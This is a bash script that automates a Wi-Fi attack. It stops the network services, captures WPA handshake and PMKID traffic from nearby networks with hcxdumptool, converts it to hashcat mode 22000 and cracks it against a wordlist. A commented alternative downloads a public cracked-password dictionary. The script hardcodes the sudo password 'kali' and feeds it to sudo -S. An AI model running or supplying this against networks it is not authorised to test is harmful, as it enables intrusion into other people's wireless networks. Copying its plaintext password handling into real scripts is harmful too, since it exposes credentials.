#!/bin/bash

# Function to run sudo commands without password prompt
run_sudo() {
    echo "Executing: sudo $@"
    sudo -S <<< "$(echo $PASSWORD)" "$@"
}

# Set your sudo password here
PASSWORD="kali"

# Step 1: Stop services accessing WLAN device
run_sudo systemctl stop NetworkManager.service
run_sudo systemctl stop wpa_supplicant.service

# Step 2: Start hcxdumptool for capturing traffic
hcxdumptool -i wlan0 -w dumpfile.pcapng --rds=1 -F

# Step 3: Wait for capture, then exit hcxdumptool
# (Manual intervention required here to capture necessary data)

# Step 4: Restart stopped services to reactivate network connection
run_sudo systemctl start wpa_supplicant.service
run_sudo systemctl start NetworkManager.service

# Step 5: Convert captured traffic to hash format 22000
hcxpcapngtool -o hash.hc22000 -E wordlist dumpfile.pcapng

# Step 6: Run Hashcat on the WPA traffic word list
hashcat -m 22000 hash.hc22000 wordlist

# Additional option for Hashcat from the cracked.txt.gz file
# wget https://wpa-sec.stanev.org/dict/cracked.txt.gz
# hashcat -m 22000 test.hc22000 cracked.txt.gz
